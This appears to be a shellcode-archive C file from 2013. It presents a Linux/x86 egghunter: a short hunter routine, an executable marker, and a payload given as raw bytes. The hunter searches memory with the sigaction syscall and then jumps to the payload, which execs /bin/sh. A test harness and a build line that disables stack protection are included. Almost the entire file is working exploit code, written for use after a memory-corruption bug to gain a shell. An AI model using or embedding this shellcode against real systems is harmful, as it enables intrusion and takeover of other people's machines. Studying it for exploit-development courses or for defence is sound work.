/*
Title   : egghunter shellcode
        : hunter (30 bytes), marker (8 bytes), shellcode (28 bytes)
Date    : 28 May 2013
Author  : Russell Willis <codinguy@gmail.com>
Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)

Comments:
    Using sigaction system call for hunter code for robust operation.
    Based on paper 'Safely Searching Process Virtual Address Space'.
    This is a must read paper, instructive and inspiring, found here:
    http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
    see section 3.1.3 sigaction(2), page 13.

    To build:
    gcc -fno-stack-protector -z execstack egghunter.c -o egghunter
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
 * Marker code must be executable, currently:
 *   /x90 nop
 *   /x50 push eax
 */
#define MARKER "\x90\x50"

char hunter[] =
    "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1"
    "\xb8"MARKER""MARKER"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
char marker[] = MARKER;
char shellcode[] =
    "\x31\xc0\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
    "\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";

int
main(void)
{
    int i=0, nmarkers = 4, markerlen = sizeof(marker)-1;
    /*
     * Setup area of memory for testing,
     * place marker and shellcode into area.
     */
    char *egg = malloc(128);
    memcpy(egg+(markerlen*nmarkers), shellcode, sizeof(shellcode)-1);
    do {
      memcpy(egg+i, marker, markerlen);
      i += markerlen;
    } while(i != (markerlen * nmarkers));
    /*
     * Run hunter to search for marker and jump to shellcode
     */
    int (*ret)() = (int(*)())hunter;
    ret();
    free(egg);
    return 0;
}